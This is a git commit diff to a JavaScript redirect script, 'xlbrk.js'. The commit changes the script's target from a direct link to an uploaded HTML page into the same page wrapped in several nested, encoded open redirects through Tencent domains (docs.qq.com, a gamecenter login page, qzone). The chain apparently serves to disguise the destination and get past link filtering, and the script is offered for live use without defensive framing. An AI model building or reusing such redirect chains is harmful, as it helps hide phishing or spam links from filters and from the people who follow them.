96889e412955425165b340eab900f33d65a83c22
dj88888 <127208493+dj88888@users.noreply.github.com>
2025-03-28 11:16:47 +0800

    Update xlbrk.js

--- xlbrk.js
+++ xlbrk.js
@@ -1,7 +1,7 @@
 (function smartRedirect() {
     try {
         // 创建目标URL对象（请替换实际地址）
-        const target = new URL('https://one.zjzy.vip/upload/default/20250328111243FoF4R6rw.html');
+        const target = new URL('https://docs.qq.com/scenario/link.html?_wv=1072&url=https%3A%2F%2Fyouxi.gamecenter.qq.com%2Fcomm-htdocs%2Flogin%2FloginSuccess.html%3Fs_url%3Dhttps%253A%252F%252Fdocs.qq.com%252Fscenario%252Flink.html%253Furl%253Dhttps%25253A%25252F%25252Fh5.qzone.qq.com%25252Fminiapp%25252Fact%25252FhippyJump%252523%25252F%25253Fschema%25253Dhttp%2525253A%2525252F%2525252F/https://one.zjzy.vip/upload/default/20250328111243FoF4R6rw.html');
         
         // 合并当前参数（智能处理重复参数）
         const params = new URLSearchParams(location.search);
